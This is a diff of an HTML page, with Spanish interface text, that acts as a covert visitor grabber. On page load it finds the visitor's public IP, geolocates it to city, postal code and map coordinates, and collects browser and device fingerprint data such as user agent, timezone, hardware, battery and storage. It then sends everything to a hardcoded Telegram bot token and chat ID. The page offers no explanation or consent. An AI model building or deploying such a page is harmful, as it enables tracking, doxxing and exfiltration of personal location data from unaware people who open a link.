@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>📊 Dispositivo → Telegram</title>
+  <title>🌍 Geo+ → Telegram</title>
   <style>
     body, html {
       margin:0; padding:0;
@@ -15,18 +15,18 @@
     .card {
       background:#1f1f1f;
       padding:2rem; border-radius:12px;
-      max-width:380px; width:90%;
+      max-width:400px; width:90%;
       text-align:center;
       box-shadow:0 4px 20px rgba(0,0,0,0.7);
     }
-    h1 { margin:0 0 1rem; font-size:1.4rem; }
+    h1 { margin:0 0 1rem; font-size:1.5rem; }
     .status { margin-top:1rem; font-weight:bold; }
   </style>
 </head>
 <body>
 
   <div class="card">
-    <h1>Recopilando y enviando…</h1>
+    <h1>Obteniendo y enviando…</h1>
     <p class="status" id="status">Iniciando…</p>
   </div>
 
@@ -34,142 +34,139 @@
   (async () => {
     const setStatus = txt => document.getElementById('status').textContent = txt;
 
-    // —————— CONFIGURA AQUÍ tus credenciales ——————
+    // ——————————— AJUSTA ESTO ———————————
     const TOKEN   = '8154780362:AAGABBYGZUdz7x0BEju5ypWzycJfu4WB_g8';
     const CHAT_ID = '7270292739';
-    // ———————————————————————————————————————————
+    // ————————————————————————————————————
 
     setStatus('1. IP pública…');
-    let ip = 'ND';
-    try { ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip; }
-    catch {}
+    let ip = 'No disponible';
+    try {
+      ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip;
+    } catch {}
 
-    setStatus('2. Geo IP…');
-    let geo = {city:'–',region:'–',country:'–',zip:'–',isp:'–',lat:null,lon:null,map:'–'};
-    if (ip!=='ND') {
+    setStatus('2. Geolocalizando (ipapi.co)…');
+    let geo = {};
+    try {
+      const d = await fetch('https://ipapi.co/json/').then(r=>r.json());
+      if (!d.error) {
+        geo = {
+          source: 'ipapi.co',
+          city:         d.city || '–',
+          region:       d.region || '–',
+          region_code:  d.region_code || '–',
+          country:      d.country_name || '–',
+          country_code: d.country || '–',
+          postal:       d.postal || '–',
+          timezone:     d.timezone || '–',
+          org:          d.org || '–',
+          lat:          d.latitude,
+          lon:          d.longitude,
+          map:          `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`
+        };
+      } else throw 0;
+    } catch {
+      setStatus('2b. Fallback ip-api.com…');
       try {
-        const d = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,zip,isp,lat,lon`)
+        const d = await fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,region,zip,country,countryCode,isp,lat,lon,timezone`)
                          .then(r=>r.json());
         if (d.status==='success') {
           geo = {
-            city: d.city, region: d.regionName, country: d.country,
-            zip: d.zip, isp: d.isp, lat: d.lat, lon: d.lon,
-            map: `https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}`
+            source: 'ip-api.com',
+            city:         d.city,
+            region:       d.regionName,
+            region_code:  d.region,
+            country:      d.country,
+            country_code: d.countryCode,
+            postal:       d.zip,
+            timezone:     d.timezone,
+            org:          d.isp,
+            lat:          d.lat,
+            lon:          d.lon,
+            map:          `https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}`
           };
         }
       } catch {}
     }
 
-    setStatus('3. APIs y entorno…');
+    setStatus('3. Recolectando datos…');
     const ua        = navigator.userAgent;
     const plt       = navigator.platform;
-    const languages = navigator.languages.join(', ');
+    const languages = navigator.languages?.join(', ') || '–';
     const lang      = navigator.language;
     const tzDev     = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const tzOffset  = new Date().getTimezoneOffset();
-    const onLine    = navigator.onLine ? 'Sí' : 'No';
+    const online    = navigator.onLine ? 'Sí' : 'No';
     const dpr       = window.devicePixelRatio || 1;
     const scrW      = screen.width; 
     const scrH      = screen.height;
-    const availW    = screen.availWidth;
-    const availH    = screen.availHeight;
     const colorD    = `${screen.colorDepth} bits`;
-    const orientation = screen.orientation?.type || 'ND';
     const cores     = navigator.hardwareConcurrency || '–';
-    const ram       = navigator.deviceMemory ? navigator.deviceMemory+' GB (≈)' : '–';
+    const ram       = navigator.deviceMemory ? `${navigator.deviceMemory} GB (≈)` : '–';
 
-    let battLevel='–', battCharging='–', battTime='–';
+    let battLevel='–', battCharging='–';
     if (navigator.getBattery) {
       try {
         const b = await navigator.getBattery();
-        battLevel    = Math.round(b.level*100)+' %';
+        battLevel    = `${Math.round(b.level*100)} %`;
         battCharging = b.charging ? 'Sí' : 'No';
-        battTime     = b.charging
-                        ? `Hasta full en ${Math.round(b.chargingTime/60)} min`
-                        : `Descarga en ${Math.round(b.dischargingTime/60)} min`;
       } catch {}
     }
 
     let connInfo='–';
     if (navigator.connection) {
       const c = navigator.connection;
-      connInfo = `${c.effectiveType} @${c.downlink} Mb/s, RTT ${c.rtt} ms, SaveData: ${c.saveData?'Sí':'No'}`;
+      connInfo = `${c.effectiveType} @${c.downlink} Mb/s, RTT ${c.rtt} ms`;
     }
 
     let storage='–';
     if (navigator.storage?.estimate) {
       try {
         const e = await navigator.storage.estimate();
-        storage = e.usage && e.quota
-          ? `${(e.usage/1024**3).toFixed(2)}/${(e.quota/1024**3).toFixed(2)} GB`
-          : '–';
+        storage = `${(e.usage/1024**3).toFixed(2)}/${(e.quota/1024**3).toFixed(2)} GB`;
       } catch {}
     }
 
-    setStatus('4. WebGL para GPU…');
-    // Detección WebGL GPU renderer/vendor
-    let glRenderer='–', glVendor='–';
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (gl) {
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        if (dbg) {
-          glRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-          glVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-        }
-      }
-    } catch {}
-
-    setStatus('5. Preparando mensaje…');
-    const text = `
-<b>🌐 Ubicación (IP)</b>
-📍 ${geo.city}, ${geo.region} (${geo.zip}), ${geo.country}
-🏢 ISP: ${geo.isp}
+    setStatus('4. Preparando mensaje…');
+    const message = `
+<b>🌍 Ubicación (via ${geo.source})</b>
+📍 ${geo.city}, ${geo.region} (${geo.region_code}) ${geo.postal}, ${geo.country} [${geo.country_code}]
+⌚ Zona: ${geo.timezone}
+🏢 Org: ${geo.org}
 <a href="${geo.map}">Ver en Maps</a>
 
-<b>🖥 Entorno & Navegador</b>
+<b>🖥️ Info Dispositivo</b>
 • <b>IP:</b> ${ip}
 • <b>Plataforma:</b> ${plt}
-• <b>SO/Navegador:</b> ${ua}
+• <b>UA:</b> ${ua}
 • <b>Idiomas:</b> ${languages}
-• <b>Idioma raíz:</b> ${lang}
-• <b>Zona horaria:</b> ${tzDev} (offset ${tzOffset} min)
-• <b>Línea:</b> ${onLine}
+• <b>Root Lang:</b> ${lang}
+• <b>Zona Dev:</b> ${tzDev} (offset ${tzOffset}m)
+• <b>Online:</b> ${online}
 
 <b>⚙️ Hardware & Pantalla</b>
 • <b>RAM:</b> ${ram}
 • <b>CPU cores:</b> ${cores}
-• <b>GPU:</b> ${glRenderer} / ${glVendor}
-• <b>Pantalla:</b> ${scrW}×${scrH} px (@${dpr}×)
-• <b>Área útil:</b> ${availW}×${availH}
-• <b>Orientación:</b> ${orientation}
+• <b>Pantalla:</b> ${scrW}×${scrH} px @${dpr}×
 • <b>Profundidad:</b> ${colorD}
 
-<b>🔌 Conexión</b>
-• ${connInfo}
+<b>🔌 Conexión:</b> ${connInfo}
+<b>🔋 Batería:</b> ${battLevel} (Cargando: ${battCharging})
+<b>💾 Almacenamiento:</b> ${storage}
+`;
 
-<b>🔋 Batería</b>
-• Nivel: ${battLevel}
-• Cargando: ${battCharging}
-• Tiempo: ${battTime}
-
-<b>💾 Almacenamiento</b>
-• ${storage}
-    `;
-
-    setStatus('6. Enviando a Telegram…');
-    const url = 'https://api.telegram.org/bot'+TOKEN+'/sendMessage'
-              + '?chat_id='+CHAT_ID
-              + '&parse_mode=HTML'
-              + '&disable_web_page_preview=true'
-              + '&text='+encodeURIComponent(text);
+    setStatus('5. Enviando a Telegram…');
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`
+              + `?chat_id=${CHAT_ID}`
+              + `&parse_mode=HTML`
+              + `&disable_web_page_preview=true`
+              + `&text=${encodeURIComponent(message)}`;
 
     try {
       const res = await fetch(url);
-      setStatus(res.ok ? '✅ Enviado' : '❌ Error al enviar');
+      setStatus(res.ok ? '✅ Enviado' : '❌ Error');
     } catch {
-      setStatus('❌ Excepción al enviar');
+      setStatus('❌ Excepción');
     }
 
   })();
